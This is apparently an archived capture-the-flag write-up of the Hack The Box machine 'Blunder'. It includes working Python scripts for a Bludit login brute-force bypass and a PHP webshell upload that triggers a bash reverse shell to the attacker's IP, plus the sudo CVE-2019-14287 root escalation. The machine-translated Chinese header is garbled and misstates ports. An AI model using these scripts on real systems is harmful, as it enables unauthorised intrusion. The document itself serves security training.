BludIt CMS
php泄露用户密码
CVE-2019-14287 以 root 
# 高温透射电包：失误

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/10/17/htb-blunder.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fblunder-cover.) 

错误从一个博客开始，我会发现它托管在BludIt CMS上。一些版本枚举和查看GitHub上的版本表明，此版本容易受到暴力保护的绕过以及PHP站点上的上传和执行过滤器绕过。我将为其中每个编写自己的脚本，并使用它们来获取 shell。从那里，我将找到下一个用户的信誉，在那里我将找到第一个标志。现在我还可以访问 sudo，在那里我可以看到我可以运行 sudo 来获取一个 bash shell 作为任何非 root 用户。我将利用 CVE-2019-14287 以 root 身份运行它，并获取根外壳。

## 箱子信息

名字

[失误](https://www.hackthebox.eu/home/machines/profile/254) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-blunder.png) 

发行日期

[30 五月 2020](https://twitter.com/hackthebox_eu/status/1266020307531370498)

停用日期

17 10月 2020

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fblunder-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fblunder-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 00小时 27分50秒[![嗯](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F26267)](https://www.hackthebox.eu/home/users/profile/26267)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天00小时31分钟10秒[![嗯](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F26267)](https://www.hackthebox.eu/home/users/profile/26267)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F94858)](https://www.hackthebox.eu/home/users/profile/94858)-

## 侦察

### n地图

`nmap`找到两个打开的 TCP 端口，即固态混合端口 （22） 和 HTTP （9001）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.191
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 15:04 EDT
    Nmap scan report for 10.10.10.191
    Host is up (0.049s latency).
    Not shown: 65533 filtered ports
    PORT   STATE  SERVICE
    21/tcp closed ftp
    80/tcp open   http
    
    Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
    
    root@kali# nmap -p 21,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.191
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 15:06 EDT
    Nmap scan report for 10.10.10.191
    Host is up (0.18s latency).
    
    PORT   STATE  SERVICE VERSION
    21/tcp closed ftp
    80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-generator: Blunder
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Blunder | A blunder of interesting facts
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
    

Based on the [Apache](https://packages.ubuntu.com/search?keywords=apache2) version, the host is likely running Ubuntu eoan 19.10.

### Website - TCP 80

#### Site

The site is a blog of sorts:

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200531142139911.png)](https://0xdf.gitlab.io/img/image-20200531142139911.png)

[_Click for full image_](https://0xdf.gitlab.io/img/image-20200531142139911.png)

There are three posts, Stephen King, Stadia, and USB.

#### Directory Brute Force

I’ll run against the site, and include since I know the site is PHP, and since it’s an easy box so some CTF-like stuff might show up in files:`gobuster``-x php,txt``.txt`

    root@kali# gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o scans/gobuster-root-medium -x txt
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.191
    [+] Threads:        20
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     txt
    [+] Timeout:        10s
    ===============================================================
    2020/05/30 15:21:07 Starting gobuster
    ===============================================================
    /about (Status: 200)
    /0 (Status: 200)
    /admin (Status: 301)
    ...[snip]...
    /robots.txt (Status: 200)
    ...[snip]...
    /todo.txt (Status: 200)
    /usb (Status: 200)
    ...[snip]...
    

It was slow, and started dumping errors consistently. I gave run, and it didn’t have the errors, but didn’t find anything else useful.`dirsearch`

#### /admin

`/admin/` leads to an admin login for [Bludit](https://www.bludit.com/):

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200531143852708.png) 

Bludit is a content management system (CMS).

#### todo.txt

`/todo.txt` returns a list of tasks.

    -Update the CMS
    -Turn off FTP - DONE
    -Remove old users - DONE
    -Inform fergus that the new blog needs images - PENDING
    

Turning off FTP explains why it was coming back closed in . I’ll note the username fergus seems to manage the blog. And that the task of Updating the CMS isn’t marked done.`nmap`

### Bludit Vulnerabilities

#### searchsploit

`searchsploit` returns two vulnerabilities:

    root@kali# searchsploit bludit
    ----------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                     |  Path
    ----------------------------------------------------------------------------------- ---------------------------------
    Bludit - Directory Traversal Image File Upload (Metasploit)                        | php/remote/47699.rb
    bludit Pages Editor 3.0.0 - Arbitrary File Upload                                  | php/webapps/46060.txt
    ----------------------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results
    
    

The arbitrary file upload can be RCE, but it is also from 2018, and [patched in version 3.1.0](https://github.com/bludit/bludit/issues/812). The MSF one looks more recent. Inside the code, there’s a reference to the [GitHub issue describing the vuln](https://github.com/bludit/bludit/issues/1081), and that it was patched in v3.10.0.

#### Google

Some Googling led me to [this post from Rastating](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) from last October. It describes how Bludit has a mechanism to track requests from a given IP and then block the IP eventually, and how there’s a bug that allows brute force anyway. The CMS tries to get the IP from first the header, than the PHP records of the client IP. It does this because if a bunch of users sit behind a proxy, they will all have the same IP address, and it doesn’t want to ban all of them inaccurately. The problem is that I can control this field, so as long as I change it on each attempt, I will never trigger the protection.`X-FORWARDED-FOR`

Rastating provides a proof of concept Python3 script with the post as well.

### Bludit Version

There is a version number in the CSS hrefs in the source, but it’s not clear to me that’s it’s the Blundit version:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621062118781.png) 

I searched the [Bludit repo](https://github.com/bludit/bludit/search?q=bootstrap.min.css%3Fversion&unscoped_q=bootstrap.min.css%3Fversion) for “bootstrap.min.css?version”, and it looks like that is the Bludit version:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200621062422807.png) 

I can also confirm the version using the [releases page](https://github.com/bludit/bludit/releases), which seems to act as the change log for the CMS. I can see that for v3.10.0, TinyMCE was updated to 5.0.16. Searching for in this repo, I see has the version number. On Blunder, it’s 5.0.8:`TinyMCE``/bl-plugins/tinymce/metadata.json`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200531150442296.png) 

This means that the Bludit is v3.9.2 or older. In the release notes for v3.10.0, it mentions fixing both the brute force bypass and two code execution vulnerabilities:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200601103710245.png) 

So this site should be vulnerable to these exploits if I can get creds.

## Shell as www-data

### Brute Force Creds for fergus

Given that I have the vulnerability that allows for credential brute force, and the hint from that fergus is a username, I’m going to try to find creds using brute force.`todo.txt`

#### Make Wordlist

Before just trying , I thought that using [cewl](https://github.com/digininja/CeWL) to make a custom wordlist from the site might be a more interesting path that the box author might have taken. will make a wordlist from a website. I’ll create one from the main page here:`rockyou``cewl`

    root@kali# cewl http://10.10.10.191 > wordlist 
    

After I remove the first line with ( banner output), the list has 349 passwords:`vim``cewl`

    root@kali# wc -l wordlist 
    349 wordlist
    

#### Update Script

The POC script from Rastating proves the concept, but it isn’t set up to exploit. I’ll make a bunch of changes, having it load my wordlist as an arg from the command line, using to print status but on the same line so it doesn’t blast my terminal, removing the dummy passwords. My script looks like:`\r`

    #!/usr/bin/env python3
    import re
    import requests
    import sys
    
    host = 'http://10.10.10.191'
    login_url = host + '/admin/login'
    username = 'fergus'
    
    with open(sys.argv[1], 'r') as f:
        wordlist = [x.strip() for x in f.readlines()]
    
    for password in wordlist:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
    
        print(f'\r[*] Trying: {password:<90}'.format(p = password), end="", flush=True)
    
        headers = {
            'X-Forwarded-For': password,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }
    
        data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''
        }
    
        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
    
        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print('\rSUCCESS: Password found!' + 50*" ")
                print(f'Use {username}:{password} to login.')
                print()
                break
    

When I run it, it will show whatever password is being attempted at the moment, eventually finding one and printing that and exiting. It takes about 16 seconds:

    root@kali# time ./bludit_brute.py wordlist 
    SUCCESS: Password found!                                                                              
    Use fergus:RolandDeschain to login.
    
    
    real    0m16.018s
    user    0m1.840s
    sys     0m0.253s
    

### PHP Upload Exploit

There’s a Metasploit script that will just run this, but I want to understand what’s happening. There are two issues on GitHub about this, [1079](https://github.com/bludit/bludit/issues/1079) and [1081](https://github.com/bludit/bludit/issues/1081). The first takes advantage of the fact that when a PHP file is uploaded, it is stored in a temporary location before the extension check. If the extension check returns that the file is ok, it is moved to the right location. But if the check returns that it fails, the file is not removed from the knowable temporary location. Code won’t run out of that location due to the file from the root of the project:`.htaccess`

    # Deny direct access to the next directories
    rewriteRule ^bl-content/(databases|workspaces|pages|tmp)/.*$ - [R=404,L]
    

However, I can override that by uploading a new file to that directory.`.htaccess`

The second ([1081](https://github.com/bludit/bludit/issues/1081)) is a criticism of an incomplete fixing of the bug between versions, and as both ticket are closed with “Fixed in Bludit v3.10.0.”, I’ll focus on the first to start.

My script will take the following steps:

1.  Login.
2.  Get a CSRF token from the uploads page.
3.  Upload the webshell as a file. Server will say it fails, but copy will still be saved in .`.php``/bl-content/tmp`
4.  Upload file that turns off .`.htaccess``RewriteEngine`
5.  Trigger webshell with reverse shell on port 443.

My script is:

    #!/usr/bin/env python3
    
    import netifaces as ni
    import re
    import requests
    
    
    callback_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    username = 'fergus'
    password = 'RolandDeschain'
    url = 'http://10.10.10.191'
    
    
    s = requests.session()
    
    # Login
    resp = s.get(f'{url}/admin/')
    csrf = re.findall('name="tokenCSRF" value="([0-9a-f]{32,})"', resp.text)[0]
    s.post(f'{url}/admin/', allow_redirects=False,
            data = {'tokenCSRF': csrf, 'username': username, 'password': password, 'remember': 'true', 'save': ''})
    
    # Get CSRF to upload images
    resp = s.get(f'{url}/admin/new-content/index.php')
    csrf = re.findall('\nvar tokenCSRF = "([0-9a-f]{32,})";', resp.text)[0]
    
    # Upload webshell
    form_data = {'images[]': ('0xdf.php', '<?php system($_REQUEST["cmd"]); ?>', 'image/png')}
    data = {'uuid': 'junk',
            'tokenCSRF': csrf}
    s.post(f'{url}/admin/ajax/upload-images', data=data, files=form_data, proxies={'http':'http://127.0.0.1:8080'}, allow_redirects=False)
    
    # Upload .htaccess file
    form_data = {'images[]': ('.htaccess', 'RewriteEngine off', 'image/png')}
    s.post(f'{url}/admin/ajax/upload-images', data=data, files=form_data, proxies={'http':'http://127.0.0.1:8080'}, allow_redirects=False)
    
    # Trigger Shell
    resp = s.get(f'{url}/bl-content/tmp/0xdf.php', params={'cmd':f'bash -c "bash -i >& /dev/tcp/{callback_ip}/443 0>&1"'})
    

### Shell

I can run that and get a shell:

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.191.
    Ncat: Connection from 10.10.10.191:47374.
    bash: cannot set terminal process group (1108): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
    

## Priv: www-data –> huge

### Enumeration

There’s a couple of users, and I think some intentional false paths in the home directory. Eventually I made it back into the directory to look at the web configs. Interesting, there were two versions of Bludit there:`shaun``/var/www`

    www-data@blunder:/var/www$ ls  
    bludit-3.10.0a  bludit-3.9.2  html
    

After a bunch of looking around in both directories, I found the file that holds the database config, in . v3.9.2 had two users:`/bl-content/databases/users.php`

    <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
    {
        "admin": {
            "nickname": "Admin",
            "firstName": "Administrator",
            "lastName": "",
            "role": "admin",
            "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
            "salt": "5dde2887e7aca",
            "email": "",
            "registered": "2019-11-27 07:40:55",
            "tokenRemember": "",
            "tokenAuth": "b380cb62057e9da47afce66b4615107d",
            "tokenAuthTTL": "2009-03-15 14:00",
            "twitter": "",
            "facebook": "",
            "instagram": "",
            "codepen": "",
            "linkedin": "",
            "github": "",
            "gitlab": ""
        },
        "fergus": {
            "firstName": "",
            "lastName": "",
            "nickname": "",
            "description": "",
            "role": "author",
            "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
            "salt": "jqxpjfnv",
            "email": "",
            "registered": "2019-11-27 13:26:44",
            "tokenRemember": "657a282fad58fab9e0e920223c45c915",
            "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
            "tokenAuthTTL": "2009-03-15 14:00",
            "twitter": "",
            "facebook": "",
            "codepen": "",
            "instagram": "",
            "github": "",
            "gitlab": "",
            "linkedin": "",
            "mastodon": ""
        }
    }
    

Based on the length, the passwords look like SHA1 hashes. Neither cracked by goolging or [crackstation](https://crackstation.net/). In the v3.10.0 config, there’s only one user:

    <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
    {
        "admin": {
            "nickname": "Hugo",
            "firstName": "Hugo",
            "lastName": "",
            "role": "User",
            "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
            "email": "",
            "registered": "2019-11-27 07:40:55",
            "tokenRemember": "",
            "tokenAuth": "b380cb62057e9da47afce66b4615107d",
            "tokenAuthTTL": "2009-03-15 14:00",
            "twitter": "",
            "facebook": "",
            "instagram": "",
            "codepen": "",
            "linkedin": "",
            "github": "",
            "gitlab": ""}
    }
    

This must be what the note about cleaning up extra users was about. Perhaps the admin is setting up version 3.10, but hasn’t configured the move yet. This hash does break in [CrackStation](https://crackstation.net/):

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200601160636705.png) 

### su

I’ll also note that the admin user’s name is hugo. I’ll try to hugo, and it works:`su`

    www-data@blunder:/var/www$ su - hugo
    Password: 
    hugo@blunder:~$
    

From there I can access :`user.txt`

    hugo@blunder:~$ cat user.txt
    da700cb5************************
    

## Priv: hugo –> root

### Enumeration

`sudo -l` gives something interesting:

    hugo@blunder:~$ sudo -l
    Password: 
    Matching Defaults entries for hugo on blunder:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User hugo may run the following commands on blunder:
        (ALL, !root) /bin/bash
    

This means that I can run as any user except for root, which is a shame, as root is the user I want to run it as.`sudo /bin/bash`

### CVE-2019-14287

The configuration above is supposed to stop as running as the root user. There was a public CVE release in November 2019 about how there were other ways to enter root besides that got around this restriction. This impacts versions before 1.8.28. I can see Blunder is running 1.8.25:`sudo``root``sudo`

    hugo@blunder:~$ sudo --version
    Sudo version 1.8.25p1
    Sudoers policy plugin version 1.8.25p1
    Sudoers file grammar version 46
    Sudoers I/O plugin version 1.8.25p1
    

When running , you can enter to say which user to run as. You can also enter the user as a number in the format . root is used id 0, so I can try:`sudo``-u [user]``-u#[uid]`

    hugo@blunder:~$ sudo -u#0 /bin/bash
    Password: 
    Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.
    

So far things are working as expected. The vulnerability is that I can enter user id -1, and will treat that as root. It works:`sudo`

    hugo@blunder:~$ sudo -u#-1 /bin/bash
    Password:
    root@blunder:/home/hugo#
    

Now I can grab :`root.txt`

    root@blunder:/root# cat root.txt
    2f1f6d99************************
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/10/17/htb-blunder.html)